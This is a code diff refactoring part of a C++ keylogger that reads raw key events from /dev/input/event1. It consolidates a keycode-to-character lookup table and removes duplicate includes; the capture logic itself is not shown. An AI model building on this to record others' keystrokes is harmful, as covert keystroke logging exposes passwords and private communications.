@@ -2,7 +2,6 @@
 #include <string>
 #define DEV_PATH "/dev/input/event1"
 #include <vector>
-#include <iostream>
 #include <linux/input.h>
 #include <stdlib.h>
 #include <sys/types.h>
@@ -13,17 +12,12 @@
 #include <iostream>
 #include <errno.h>
 #include <string.h>
-#include <string>
 #include <assert.h>
-#include <fstream>
 #include <sstream>
 #include <exception>
 #include <fstream>
-#include <string>
-#include <map>
 #include <stdio.h>
 #include <termios.h>
-#include <unistd.h>
 #include <thread>
 using namespace std;
 
@@ -203,141 +197,21 @@ bool isLetter(const int value)
 
 class Key_logger{
 private:
-    map<unsigned short, string> keys;
+
+    map<unsigned short, string> keys = {
+        {1,"ESC "}, {2,"1"}, {3,"2"}, {4,"3"}, {5,"4"}, {6,"5"}, {7,"6"}, {8,"7"}, {9,"8"}, {10,"9"}, {11,"0"}, {12,"-"}, {13,"="}, {14,"BACKSPACE"},
+        {15,"TAB"}, {16,"q"}, {17,"w"}, {18,"e"}, {19,"r"}, {20,"t"}, {21,"y"}, {22,"u"}, {23,"i"}, {24,"o"}, {25,"p"}, {26,"["}, {27,"]"}, {28,"ENTER"},
+        {29, "CNTRL"}, {30,"a"}, {31,"s"}, {32, "d"}, {33, "f"}, {34, "g"}, {35,"h"}, {36,"j"}, {37,"k"}, {38, "l"}, {39,";"}, {40,"\'"}, {41,"`"}, {42,"LSHIFT"},
+        {43,"\\"}, {44,"z"}, {45,"x"}, {46,"c"}, {47,"v"}, {48,"b"}, {49,"n"}, {50,"m"}, {51,","}, {52,"."}, {53,"/"}, {54,"RSHIFT"}, {56, "LALT"}, 
+        {57,"SPACE"}, {58,"CAPSLOCK"}, {59,"f1"}, {60,"f2"}, {61,"f3"}, {62,"f4"}, {63,"f5"}, {64,"f6"}, {65,"f7"}, {66,"f8"}, {67,"f9"}, {68,"f10"},
+        {69,"NUMLOCK"}, {70,"SCROLLOCK"}, {100,"RALT"}, {103,"UP"}, {108,"DOWN"}, {105,"LEFT"}, {106,"RIGHT"}, {110,"INS"}, {111,"DEL"}, {119, "PAUSEBREAK"}, 
+        {125,"WIN"}, {1001,"ESC"}, {1002,"!"}, {1003,"@"}, {1004,"#"}, {1005,"$"}, {1006,"%"}, {1007,"^"}, {1008,"&"}, {1009,"*"}, {1010,"("}, {1011,")"},
+        {1012,"_ "}, {1013,"+"}, {1016,"Q"}, {1017,"W"}, {1018,"E"}, {1019,"R"}, {1020,"T"}, {1021,"Y"}, {1022,"U"}, {1023,"I"}, {1024,"O"}, {1025,"P"}, 
+        {1026,"{"}, {1027,"}"}, {1030,"A"}, {1031,"S"}, {1032, "D"}, {1033, "F"}, {1034, "G"}, {1035,"H"}, {1036,"J"}, {1037,"K"}, {1038, "L"}, {1039,":"}, 
+        {1040,"\""}, {1041,"~"}, {1042,"LSHIFT"}, {1043,"|"}, {1044,"Z"}, {1045,"X"}, {1046,"C"}, {1047,"V"}, {1048,"B"}, {1049,"N"}, {1050,"M"}, {1051,"<"}, 
+        {1052,">"}, {1053,"?"}, {1058,"CAPSLOCK "}
+    };
 public:
-    Key_logger(){
-
-        keys.insert({1,"ESC "});
-        keys.insert({2,"1"});
-        keys.insert({3,"2"});
-        keys.insert({4,"3"});
-        keys.insert({5,"4"});
-        keys.insert({6,"5"});
-        keys.insert({7,"6"});
-        keys.insert({8,"7"});
-        keys.insert({9,"8"});
-        keys.insert({10,"9"});
-        keys.insert({11,"0"});
-        keys.insert({12,"-"});
-        keys.insert({13,"="});
-        keys.insert({14,"BACKSPACE"});
-        keys.insert({15,"TAB"});
-        keys.insert({16,"q"});
-        keys.insert({17,"w"});
-        keys.insert({18,"e"});
-        keys.insert({19,"r"});
-        keys.insert({20,"t"});
-        keys.insert({21,"y"});
-        keys.insert({22,"u"});
-        keys.insert({23,"i"});
-        keys.insert({24,"o"});
-        keys.insert({25,"p"});
-        keys.insert({26,"["});
-        keys.insert({27,"]"});
-        keys.insert({28,"ENTER"});
-        keys.insert({29, "CNTRL"});
-        keys.insert({30,"a"});
-        keys.insert({31,"s"});
-        keys.insert({32, "d"});
-        keys.insert({33, "f"});
-        keys.insert({34, "g"});
-        keys.insert({35,"h"});
-        keys.insert({36,"j"});
-        keys.insert({37,"k"});
-        keys.insert({38, "l"});
-        keys.insert({39,";"});
-        keys.insert({40,"\'"});
-        keys.insert({41,"`"});
-        keys.insert({42,"LSHIFT"});
-        keys.insert({43,"\\"});
-        keys.insert({44,"z"});
-        keys.insert({45,"x"});
-        keys.insert({46,"c"});
-        keys.insert({47,"v"});
-        keys.insert({48,"b"});
-        keys.insert({49,"n"});
-        keys.insert({50,"m"});
-        keys.insert({51,","});
-        keys.insert({52,"."});
-        keys.insert({53,"/"});
-        keys.insert({54,"RSHIFT"});
-        keys.insert({56, "LALT"});
-        keys.insert({57,"SPACE"});
-        keys.insert({58,"CAPSLOCK"});
-        keys.insert({59,"f1"});
-        keys.insert({60,"f2"});
-        keys.insert({61,"f3"});
-        keys.insert({62,"f4 "});
-        keys.insert({63,"f5 "});
-        keys.insert({64,"f6 "});
-        keys.insert({65,"f7 "});
-        keys.insert({66,"f8 "});
-        keys.insert({67,"f9 "});
-        keys.insert({68,"f10 "});
-        keys.insert({69,"NUMLOCK "});
-        keys.insert({70,"SCROLLOCK "});
-        keys.insert({100,"RALT "});
-        keys.insert({103,"UP "});
-        keys.insert({108,"DOWN "});
-        keys.insert({105,"LEFT "});
-        keys.insert({106,"RIGHT "});
-        keys.insert({110,"INS "});
-        keys.insert({111,"DEL "});
-        keys.insert({119, "PAUSEBREAK"});
-        keys.insert({125,"WIN "});
-
-        keys.insert({1001,"ESC"});
-        keys.insert({1002,"!"});
-        keys.insert({1003,"@ "});
-        keys.insert({1004,"# "});
-        keys.insert({1005,"$ "});
-        keys.insert({1006,"% "});
-        keys.insert({1007,"^ "});
-        keys.insert({1008,"& "});
-        keys.insert({1009,"* "});
-        keys.insert({1010,"( "});
-        keys.insert({1011,") "});
-        keys.insert({1012,"_ "});
-        keys.insert({1013,"+ "});
-        keys.insert({1016,"Q "});
-        keys.insert({1017,"W"});
-        keys.insert({1018,"E"});
-        keys.insert({1019,"R "});
-        keys.insert({1020,"T "});
-        keys.insert({1021,"Y "});
-        keys.insert({1022,"U "});
-        keys.insert({1023,"I "});
-        keys.insert({1024,"O "});
-        keys.insert({1025,"P "});
-        keys.insert({1026,"{"});
-        keys.insert({1027,"}"});
-
-        keys.insert({1030,"A"});
-        keys.insert({1031,"S"});
-        keys.insert({1032, "D"});
-        keys.insert({1033, "F"});
-        keys.insert({1034, "G"});
-        keys.insert({1035,"H"});
-        keys.insert({1036,"J"});
-        keys.insert({1037,"K"});
-        keys.insert({1038, "L"});
-        keys.insert({1039,":"});
-        keys.insert({1040,"\""});
-        keys.insert({1041,"~"});
-        keys.insert({1042,"LSHIFT"});
-        keys.insert({1043,"|"}); //!!
-        keys.insert({1044,"Z"});
-        keys.insert({1045,"X"});
-        keys.insert({1046,"C"});
-        keys.insert({1047,"V"});
-        keys.insert({1048,"B"});
-        keys.insert({1049,"N"});
-        keys.insert({1050,"M"});
-        keys.insert({1051,"<"});
-        keys.insert({1052,">"});
-        keys.insert({1053,"?"});
-        keys.insert({1058,"CAPSLOCK  "});
-    }
 
     int check(int result) {
         if (result >= 0)
